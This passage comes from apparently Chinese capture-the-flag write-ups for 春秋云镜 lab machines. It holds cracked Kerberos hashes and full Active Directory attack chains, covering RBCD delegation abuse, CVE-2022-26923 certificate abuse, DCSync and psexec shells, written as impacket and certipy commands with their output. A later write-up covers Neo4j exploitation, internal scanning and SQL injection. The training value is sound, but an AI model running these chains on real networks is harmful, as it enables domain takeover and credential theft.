b4d238908b8d37009f9dfb5402a13f1b60567f4f8185fbbf5c9fbefe14bbe0b1f89980cd604ff68b572afe6af2d1bb4d6720abc8bdc51e47df9da3ebb4801d08f8be90c12343699eff8855dbfc0d63e796ffcec62169fa4e3ee97440ca0eb2eb985e6785f93aa1d34444235b1ce8937acf0121fe05ec2c589ba625fab1c90bd168637124f99378007fa9c459b07f946a65d3c7131cdad16af4b591becc04526125e2c255072df4a32214d393aab5f27cff28b66859c1b9bb06600d4c7a51cd7ae583d4602fd1ebd6ffc269ee60ed861abb28bb547de5e848955d5279d9e08523edb67fbd171d1af1730f2fba: winniethepooh</span><br><span class=\"line\">$krb5asrep$ 23 $huachunmei@xiaorang.lab@XIAORANG.LAB:c640ad4dd669f00b128bad8d1ef8df86$ 0b8e74c7b36ec7daceb707ce176d18a8d15f8cd3ba3154f8ae4f29e9e54f538ab19bc766ea554698677d7f1e6f9418fd7419d82a1ca79582ed70f3de5b5c771a6e7df373fc84a9921b697e7c7d42c17e85f1b2ae73b1ec15bf1bbc59e20bfb2d4e5e52c53c1e88da9c0815434acd8298948f7becb0f15bfdcce4153d025570249523f7507c20f694f5e0ec23c8e7ef5d446aa5fec15315ab314658fc36befc39d7cdf037fa1f165a83ab257fa34a17c4b512ccca27284b97d8f7bdf51cdb0a069e2df4f952c3c52fa47fb58a0fe4e80d0907062fad92edf4d799306ddb103468accf1c2a6b172f2bd7d7c61d: 1qaz2wsx</span><br></pre></td></tr></table></figure>\n\n<p>用 bloodhound 进行域内信息搜集</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# bloodhound-python -u lixiuying -p winniethepooh -d xiaorang.lab -dc XR-DC01.xiaorang.lab -c all --dns-tcp -ns 172.22.15.13 --auth-method ntlm --zip</span><br><span class=\"line\">INFO: Found AD domain: xiaorang.lab</span><br><span class=\"line\">INFO: Connecting to LDAP server: XR-DC01.xiaorang.lab</span><br><span class=\"line\">INFO: Found 1 domains</span><br><span class=\"line\">INFO: Found 1 domains in the forest</span><br><span class=\"line\">INFO: Found 3 computers</span><br><span class=\"line\">INFO: Connecting to LDAP server: XR-DC01.xiaorang.lab</span><br><span class=\"line\">INFO: Found 37 users</span><br><span class=\"line\">INFO: Found 53 groups</span><br><span class=\"line\">INFO: Found 2 gpos</span><br><span class=\"line\">INFO: Found 1 ous</span><br><span class=\"line\">INFO: Found 19 containers</span><br><span class=\"line\">INFO: Found 0 trusts</span><br><span class=\"line\">INFO: Starting computer enumeration with 10 workers</span><br><span class=\"line\">INFO: Querying computer: XR-CA.xiaorang.lab</span><br><span class=\"line\">INFO: Querying computer: XR-0687.xiaorang.lab</span><br><span class=\"line\">INFO: Querying computer: XR-DC01.xiaorang.lab</span><br><span class=\"line\">INFO: Done in 00M 05S</span><br><span class=\"line\">INFO: Compressing output into 20250402040344_bloodhound.zip</span><br></pre></td></tr></table></figure>\n\n<p>域用户 LIXIUYING 对计算机 XR-0687$ 具有 Generic Write 权限</p>\n<p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%983.png\"></p>\n<p>可以通过修改目标的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性（配置 RBCD）获取目标 SYSTEM 权限。</p>\n<p>添加一个机器用户</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# impacket-addcomputer -computer-name &#x27;EVILCOMPUTER$&#x27; -computer-pass &#x27;123@#ABC&#x27; -dc-host XR-DC01.xiaorang.lab -dc-ip 172.22.15.13 &quot; xiaorang.lab/lixiuying: winniethepooh &quot;</span><br><span class=\"line\">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Successfully added machine account EVILCOMPUTER$ with password 123@#ABC.</span><br></pre></td></tr></table></figure>\n\n<p>然后配置 RBCD：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# impacket-rbcd xiaorang.lab/lixiuying: winniethepooh -action write -delegate-from &quot;EVILCOMPUTER $&quot; -delegate-to &quot;XR-0687$&quot; -dc-ip 172.22.15.13</span><br><span class=\"line\">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty</span><br><span class=\"line\">[*] Delegation rights modified successfully!</span><br><span class=\"line\">[*] EVILCOMPUTER $ can now impersonate users on XR-0687$ via S4U2Proxy</span><br><span class=\"line\">[*] Accounts allowed to act on behalf of other identity:</span><br><span class=\"line\">[*]     EVILCOMPUTER$   (S-1-5-21-3745972894-1678056601-2622918667-1147)</span><br></pre></td></tr></table></figure>\n\n<p>请求并冒充域管权限的服务票据：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# impacket-getST xiaorang.lab/EVILCOMPUTER$:&#x27;123@#ABC&#x27; -spn cifs/XR-0687.xiaorang.lab -impersonate Administrator -dc-ip 172.22.15.13</span><br><span class=\"line\">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class=\"line\"></span><br><span class=\"line\">[-] CCache file is not found. Skipping...</span><br><span class=\"line\">[*] Getting TGT for user</span><br><span class=\"line\">[*] Impersonating Administrator</span><br><span class=\"line\">/usr/share/doc/python3-impacket/examples/getST.py:380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).</span><br><span class=\"line\">  now = datetime.datetime.utcnow()</span><br><span class=\"line\">/usr/share/doc/python3-impacket/examples/getST.py:477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).</span><br><span class=\"line\">  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)</span><br><span class=\"line\">[*] Requesting S4U2self</span><br><span class=\"line\">/usr/share/doc/python3-impacket/examples/getST.py:607: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).</span><br><span class=\"line\">  now = datetime.datetime.utcnow()</span><br><span class=\"line\">/usr/share/doc/python3-impacket/examples/getST.py:659: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).</span><br><span class=\"line\">  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)</span><br><span class=\"line\">[*] Requesting S4U2Proxy</span><br><span class=\"line\">[*] Saving ticket in Administrator@cifs_XR-0687.xiaorang.lab@XIAORANG.LAB.ccache</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─#  export KRB5CCNAME = Administrator@cifs_XR-0687.xiaorang.lab@XIAORANG.LAB.ccache</span><br><span class=\"line\"></span><br><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# impacket-psexec &#x27;xiaorang.lab/administrator@XR-0687.xiaorang.lab&#x27; -target-ip 172.22.15.35 -codec gbk -no-pass -k</span><br><span class=\"line\">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Requesting shares on 172.22.15.35.....</span><br><span class=\"line\">[*] Found writable share ADMIN$</span><br><span class=\"line\">[*] Uploading file RHzxEZPZ.exe</span><br><span class=\"line\">[*] Opening SVCManager on 172.22.15.35.....</span><br><span class=\"line\">[*] Creating service etRo on 172.22.15.35.....</span><br><span class=\"line\">[*] Starting service etRo.....</span><br><span class=\"line\">[!] Press help for extra shell commands</span><br><span class=\"line\">Microsoft Windows [版本 10.0.20348.1668]</span><br><span class=\"line\">(c) Microsoft Corporation。保留所有权利。</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\Windows\\system32 &gt;</span><br></pre></td></tr></table></figure>\n\n<p>flag03 在 C:\\users\\Administrator\\flag\\</p>\n<p>主机 172.22.15.18 (XR-CA) 存在 <code>CVE-2022-26923</code> 漏洞</p>\n<p>打 CVE-2022–26923</p>\n<p>查找证书服务器，并尝试查找可以利用的证书模板：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# certipy-ad find -u lixiuying@xiaorang.lab -p winniethepooh -dc-ip 172.22.15.13 -vulnerable -stdout</span><br><span class=\"line\">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Finding certificate templates</span><br><span class=\"line\">[*] Found 34 certificate templates</span><br><span class=\"line\">[*] Finding certificate authorities</span><br><span class=\"line\">[*] Found 1 certificate authority</span><br><span class=\"line\">[*] Found 12 enabled certificate templates</span><br><span class=\"line\">[*] Trying to get CA configuration for &#x27;xiaorang-XR-CA-CA&#x27; via CSRA</span><br><span class=\"line\">[!] Got error while trying to get CA configuration for &#x27;xiaorang-XR-CA-CA&#x27; via CSRA: Could not connect: [Errno 111] Connection refused</span><br><span class=\"line\">[*] Trying to get CA configuration for &#x27;xiaorang-XR-CA-CA&#x27; via RRP</span><br><span class=\"line\">[!] Got error while trying to get CA configuration for &#x27;xiaorang-XR-CA-CA&#x27; via RRP: [Errno Connection error (224.0.0.1:445)] [Errno 111] Connection refused</span><br><span class=\"line\">[!] Failed to get CA configuration for &#x27;xiaorang-XR-CA-CA&#x27;</span><br><span class=\"line\">[*] Enumeration output:</span><br><span class=\"line\">Certificate Authorities</span><br><span class=\"line\">  0</span><br><span class=\"line\">    CA Name                             : xiaorang-XR-CA-CA</span><br><span class=\"line\">    DNS Name                            : XR-CA.xiaorang.lab</span><br><span class=\"line\">    Certificate Subject                 : CN = xiaorang-XR-CA-CA, DC = xiaorang, DC = lab</span><br><span class=\"line\">    Certificate Serial Number           : 3ECFB0112E93BE9041059FA6DBB3C35A</span><br><span class=\"line\">    Certificate Validity Start          : 2023-06-03 07:19:59+00:00</span><br><span class=\"line\">    Certificate Validity End            : 2028-06-03 07:29:58+00:00</span><br><span class=\"line\">    Web Enrollment                      : Disabled</span><br><span class=\"line\">    User Specified SAN                  : Unknown</span><br><span class=\"line\">    Request Disposition                 : Unknown</span><br><span class=\"line\">    Enforce Encryption for Requests     : Unknown</span><br><span class=\"line\">Certificate Templates                   : [!] Could not find any certificate templates</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>使用 certipy 创建一个机器账户，并将该机器账户 dNSHostName 属性指向域控：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# certipy-ad account create -u lixiuying@xiaorang.lab -p winniethepooh -dc-ip 172.22.15.13 -user &#x27;EVILCOMPUTER2$&#x27; -pass &#x27;123@#ABC&#x27; -dns &#x27;XR-DC01.xiaorang.lab&#x27;</span><br><span class=\"line\">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Creating new account:</span><br><span class=\"line\">    sAMAccountName                      : EVILCOMPUTER2$</span><br><span class=\"line\">    unicodePwd                          : 123@#ABC</span><br><span class=\"line\">    userAccountControl                  : 4096</span><br><span class=\"line\">    servicePrincipalName                : HOST/EVILCOMPUTER2</span><br><span class=\"line\">                                          RestrictedKrbHost/EVILCOMPUTER2</span><br><span class=\"line\">    dnsHostName                         : XR-DC01.xiaorang.lab</span><br><span class=\"line\">[*] Successfully created account &#x27;EVILCOMPUTER2$&#x27; with password &#x27;123@#ABC&#x27;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>使用该机器账户向 AD CS 服务器请求域控机器的证书模板：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# certipy-ad req -u EVILCOMPUTER2\\$@xiaorang.lab -p &#x27;123@#ABC&#x27; -target 172.22.15.18 -ca &quot;xiaorang-XR-CA-CA&quot; -template Machine</span><br><span class=\"line\">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Requesting certificate via RPC</span><br><span class=\"line\">[*] Successfully requested certificate</span><br><span class=\"line\">[*] Request ID is 7</span><br><span class=\"line\">[*] Got certificate with DNS Host Name &#x27;XR-DC01.xiaorang.lab&#x27;</span><br><span class=\"line\">[*] Certificate has no object SID</span><br><span class=\"line\">[*] Saved certificate and private key to &#x27;xr-dc01.pfx&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>用申请到的证书，申请域控的 TGT：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# certipy-ad auth -pfx xr-dc01.pfx -dc-ip 172.22.15.13 -debug</span><br><span class=\"line\">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Using principal: xr-dc01$@xiaorang.lab</span><br><span class=\"line\">[*] Trying to get TGT...</span><br><span class=\"line\">[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)</span><br></pre></td></tr></table></figure>\n\n<p>使用 certipy 请求 TGT 失败，出现 <code>KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)</code> 错误。</p>\n<p><a href=\"https://github.com/CravateRouge/bloodyAD\">bloodyAD</a> 使用证书进行认证，配置 RBCD 进行攻击：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# certipy-ad cert -pfx xr-dc01.pfx &gt; xr-dc01.pem</span><br><span class=\"line\">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# bloodyAD -d xiaorang.lab -u &#x27;EVILCOMPUTER2 $&#x27; -c &#x27;:xr-dc01.pem&#x27; --host 172.22.15.13 --secure add rbcd &#x27;xr-dc01$&#x27; &#x27;EVILCOMPUTER2$&#x27;</span><br><span class=\"line\">[!] No security descriptor has been returned, a new one will be created</span><br><span class=\"line\">[+] EVILCOMPUTER2 $ can now impersonate users on xr-dc01$ via S4U2Proxy</span><br></pre></td></tr></table></figure>\n\n<p>请求并冒充域管权限的服务票据：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# impacket-getST &#x27;xiaorang.lab/EVILCOMPUTER2$: 123@#ABC&#x27; -spn LDAP/xr-dc01.xiaorang.lab -impersonate Administrator</span><br><span class=\"line\"> -dc-ip 172.22.15.13</span><br><span class=\"line\">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Getting TGT for user</span><br><span class=\"line\">[*] Impersonating Administrator</span><br><span class=\"line\">/usr/share/doc/python3-impacket/examples/getST.py: 380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).</span><br><span class=\"line\">  now = datetime.datetime.utcnow()</span><br><span class=\"line\">/usr/share/doc/python3-impacket/examples/getST.py: 477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).</span><br><span class=\"line\">  now = datetime.datetime.utcnow() + datetime.timedelta(days = 1)</span><br><span class=\"line\">[*] Requesting S4U2self</span><br><span class=\"line\">/usr/share/doc/python3-impacket/examples/getST.py: 607: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).</span><br><span class=\"line\">  now = datetime.datetime.utcnow()</span><br><span class=\"line\">/usr/share/doc/python3-impacket/examples/getST.py: 659: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).</span><br><span class=\"line\">  now = datetime.datetime.utcnow() + datetime.timedelta(days = 1)</span><br><span class=\"line\">[*] Requesting S4U2Proxy</span><br><span class=\"line\">[*] Saving ticket in Administrator@LDAP_xr-dc01.xiaorang.lab@XIAORANG.LAB.ccache</span><br><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# export KRB5CCNAME = Administrator@LDAP_xr-dc01.xiaorang.lab@XIAORANG.LAB.ccache</span><br><span class=\"line\"></span><br><span class=\"line\">DCSync 从域控导出凭据：</span><br><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# impacket-secretsdump &#x27;xiaorang.lab/administrator@XR-DC01.xiaorang.lab&#x27; -target-ip 172.22.15.13 -no-pass -k -just-dc-user Administrator</span><br><span class=\"line\">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Dumping Domain Credentials (domain\\uid: rid: lmhash: nthash)</span><br><span class=\"line\">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class=\"line\">[-] &#x27;NoneType&#x27; object has no attribute &#x27;getRemoteHost&#x27;</span><br><span class=\"line\">[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter</span><br><span class=\"line\">[*] Cleaning up...</span><br><span class=\"line\"></span><br><span class=\"line\">PTH 登录域控：</span><br><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# impacket-psexec &#x27;xiaorang.lab/administrator@XR-DC01.xiaorang.lab&#x27; -target-ip 172.22.15.13 -codec gbk -no-pass -k</span><br><span class=\"line\">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Requesting shares on 172.22.15.13.....</span><br><span class=\"line\">[*] Found writable share ADMIN$</span><br><span class=\"line\">[*] Uploading file FavsxEaA.exe</span><br><span class=\"line\">[*] Opening SVCManager on 172.22.15.13.....</span><br><span class=\"line\">[*] Creating service fjnA on 172.22.15.13.....</span><br><span class=\"line\">[*] Starting service fjnA.....</span><br><span class=\"line\">[!] Press help for extra shell commands</span><br><span class=\"line\">Microsoft Windows [版本 10.0.14393]</span><br><span class=\"line\">(c) 2016 Microsoft Corporation。保留所有权利。</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\windows\\system32 &gt; </span><br></pre></td></tr></table></figure>\n\n<p>flag 在 C:\\Users\\Administrator\\flag 下</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://h0ny.github.io/posts/2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/#as-rep-roasting\">https://h0ny.github.io/posts/2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/#as-rep-roasting</a></p>\n<p><a href=\"https://x1nri.github.io/2025/01/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3/\">https://x1nri.github.io/2025/01/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3/</a></p>\n","categories":["春秋云镜"],"tags":["靶机"]},{"title":"春秋云镜-Time","url":"/2025/04/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/","content":"<h1 id=\"FLAG1\"><a href=\"#FLAG1\" class=\"headerlink\" title=\"FLAG1\"></a>FLAG1</h1><p>首先用fscan进行信息搜集</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# ../pentest/fscan/fscan2 -h 39.98.117.163 -p 1-65535</span><br><span class=\"line\">┌──────────────────────────────────────────────┐</span><br><span class=\"line\">│    ___                              _        │</span><br><span class=\"line\">│   / _ \\     ___  ___ _ __ __ _  ___| | __    │</span><br><span class=\"line\">│  / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class=\"line\">│ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   &lt;     │</span><br><span class=\"line\">│ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    │</span><br><span class=\"line\">└──────────────────────────────────────────────┘</span><br><span class=\"line\">      Fscan Version: 2.0.0</span><br><span class=\"line\"></span><br><span class=\"line\">[2025-04-08 12:36:27] [INFO] 暴力破解线程数: 1</span><br><span class=\"line\">[2025-04-08 12:36:27] [INFO] 开始信息扫描</span><br><span class=\"line\">[2025-04-08 12:36:27] [INFO] 最终有效主机数量: 1</span><br><span class=\"line\">[2025-04-08 12:36:27] [INFO] 开始主机扫描</span><br><span class=\"line\">[2025-04-08 12:36:27] [INFO] 有效端口数量: 65535</span><br><span class=\"line\">[2025-04-08 12:36:27] [SUCCESS] 端口开放 39.98.117.163:22</span><br><span class=\"line\">[2025-04-08 12:36:28] [SUCCESS] 服务识别 39.98.117.163:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]</span><br><span class=\"line\">[2025-04-08 12:37:17] [SUCCESS] 端口开放 39.98.117.163:1337</span><br><span class=\"line\">[2025-04-08 12:37:27] [SUCCESS] 服务识别 39.98.117.163:1337 =&gt;</span><br><span class=\"line\">[2025-04-08 12:41:00] [SUCCESS] 端口开放 39.98.117.163:7473</span><br><span class=\"line\">[2025-04-08 12:41:01] [SUCCESS] 端口开放 39.98.117.163:7474</span><br><span class=\"line\">[2025-04-08 12:41:08] [SUCCESS] 端口开放 39.98.117.163:7687</span><br><span class=\"line\">[2025-04-08 12:41:11] [SUCCESS] 服务识别 39.98.117.163:7473 =&gt;  Banner:[.P]</span><br><span class=\"line\">[2025-04-08 12:41:11] [SUCCESS] 服务识别 39.98.117.163:7474 =&gt; [http]</span><br><span class=\"line\">[2025-04-08 12:41:18] [SUCCESS] 服务识别 39.98.117.163:7687 =&gt;</span><br></pre></td></tr></table></figure>\n\n<p>fscan扫描靶机，有1337、7473、7474、7687端口，7474端口是neo4j，默认密码neo4j:neo4j(可以登录，但是没什么用)，还有一个CVE-2021-34371，可以直接一把梭哈<a href=\"https://github.com/zwjjustdoit/CVE-2021-34371.jar%EF%BC%8C%E5%8F%8D%E5%BC%B9%E4%B8%80%E4%B8%AAshell\">https://github.com/zwjjustdoit/CVE-2021-34371.jar，反弹一个shell</a></p>\n<p>flag01在neo4j的目录下</p>\n<h1 id=\"FLAG2\"><a href=\"#FLAG2\" class=\"headerlink\" title=\"FLAG2\"></a>FLAG2</h1><p>然后上传一个fscan扫描内网（会出来没扫描出来的情况，需要多扫描几次）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">neo4j@ubuntu:~$ ./fscan -h 172.22.6.36/20</span><br><span class=\"line\">./fscan -h 172.22.6.36/20</span><br><span class=\"line\"></span><br><span class=\"line\">   ___                              _    </span><br><span class=\"line\">  / _ \\     ___  ___ _ __ __ _  ___| | __ </span><br><span class=\"line\"> / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class=\"line\">/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   &lt;    </span><br><span class=\"line\">\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\   </span><br><span class=\"line\">                     fscan version: 1.8.4</span><br><span class=\"line\">start infoscan</span><br><span class=\"line\">trying RunIcmp2</span><br><span class=\"line\">The current user permissions unable to send icmp packets</span><br><span class=\"line\">start ping</span><br><span class=\"line\">(icmp) Target 172.22.6.25     is alive</span><br><span class=\"line\">(icmp) Target 172.22.6.36     is alive</span><br><span class=\"line\">(icmp) Target 172.22.6.38     is alive</span><br><span class=\"line\"></span><br><span class=\"line\">[*] LiveTop 172.22.0.0/16    段存活数量为: 3</span><br><span class=\"line\">[*] LiveTop 172.22.6.0/24    段存活数量为: 3</span><br><span class=\"line\">[*] Icmp alive hosts len is: 3</span><br><span class=\"line\">172.22.6.36:22 open</span><br><span class=\"line\">172.22.6.25:445 open</span><br><span class=\"line\">172.22.6.25:139 open</span><br><span class=\"line\">172.22.6.25:135 open</span><br><span class=\"line\">172.22.6.38:80 open</span><br><span class=\"line\">172.22.6.38:22 open</span><br><span class=\"line\">172.22.6.36:7687 open</span><br><span class=\"line\">172.22.6.25:445 open</span><br><span class=\"line\">172.22.6.12:445 open</span><br><span class=\"line\">172.22.6.12:139 open</span><br><span class=\"line\">172.22.6.25:139 open</span><br><span class=\"line\">172.22.6.25:135 open</span><br><span class=\"line\">172.22.6.12:135 open</span><br><span class=\"line\">172.22.6.12:88 open</span><br><span class=\"line\"></span><br><span class=\"line\">start vulscan</span><br><span class=\"line\">[*] NetInfo </span><br><span class=\"line\">[*]172.22.6.25</span><br><span class=\"line\">   [-&gt;]WIN2019</span><br><span class=\"line\">   [-&gt;]172.22.6.25</span><br><span class=\"line\">[*] NetInfo </span><br><span class=\"line\">[*]172.22.6.12</span><br><span class=\"line\">   [-&gt;]DC-PROGAME</span><br><span class=\"line\">   [-&gt;]172.22.6.12</span><br><span class=\"line\">[*] NetBios 172.22.6.25     XIAORANG\\WIN2019              </span><br><span class=\"line\">[*] OsInfo 172.22.6.12  (Windows Server 2016 Datacenter 14393)</span><br><span class=\"line\">[*] NetBios 172.22.6.12     [+] DC:DC-PROGAME.xiaorang.lab       Windows Server 2016 Datacenter 14393</span><br><span class=\"line\">[*]172.22.6.25</span><br><span class=\"line\">   [-&gt;]WIN2019</span><br><span class=\"line\">   [-&gt;]172.22.6.25</span><br><span class=\"line\">[*] NetBios 172.22.6.25     XIAORANG\\WIN2019              </span><br><span class=\"line\">[*] WebTitle http://172.22.6.38        code:200 len:1531   title:后台登录</span><br><span class=\"line\">[*] WebTitle https://172.22.6.36:7687  code:400 len:50     title:None</span><br><span class=\"line\">已完成 7/7</span><br><span class=\"line\">[*] 扫描结束,耗时: 1m36.67936002s</span><br></pre></td></tr></table></figure>\n\n<p>172.22.6.38是一个web服务 ，用万能密码可以登录成功存在sql注入，但是不会跳转，用sqlmap跑一下</p>\n<p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time1.png\"></p>\n<p>flag02在数据库里，将oa_db.oa_users的email提出，处理一下将用户名提取出来</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# cat 1|grep -E &#x27;\\w*@&#x27; -o|grep -E &#x27;[^@]*&#x27; -o &gt;username</span><br><span class=\"line\"></span><br><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# cat username</span><br><span class=\"line\">mengxiang</span><br><span class=\"line\">mennane</span><br><span class=\"line\">menxilong</span><br><span class=\"line\">menxixiao</span><br><span class=\"line\">miaogui</span><br><span class=\"line\">miaoshu</span><br><span class=\"line\">mingfu</span><br><span class=\"line\">minglian</span><br><span class=\"line\">mingsong</span><br><span class=\"line\">mingyan</span><br><span class=\"line\">moqian</span><br><span class=\"line\">mouchun</span><br><span class=\"line\">moushan</span><br><span class=\"line\">mucheng</span><br><span class=\"line\">muchun</span><br><span class=\"line\">mujie</span><br><span class=\"line\">nangongjun</span><br><span class=\"line\">niuya</span><br><span class=\"line\">nongfan</span><br><span class=\"line\">nongyan</span><br><span class=\"line\">nongyan</span><br><span class=\"line\">nongyao</span><br><span class=\"line\">nongzhen</span><br><span class=\"line\">nongzhu</span><br><span class=\"line\">oulun</span><br><span class=\"line\">panbao</span><br><span class=\"line\">pangcheng</span><br><span class=\"line\">pangning</span><br><span class=\"line\">pangtai</span><br><span class=\"line\">pangzhen</span><br><span class=\"line\">pengyuan</span><br><span class=\"line\">pinghao</span><br><span class=\"line\">puyangfu</span><br><span class=\"line\">qiai</span><br><span class=\"line\">qiangjun</span><br><span class=\"line\">qianqing</span><br><span class=\"line\">qianyi</span><br><span class=\"line\">qianyou</span><br><span 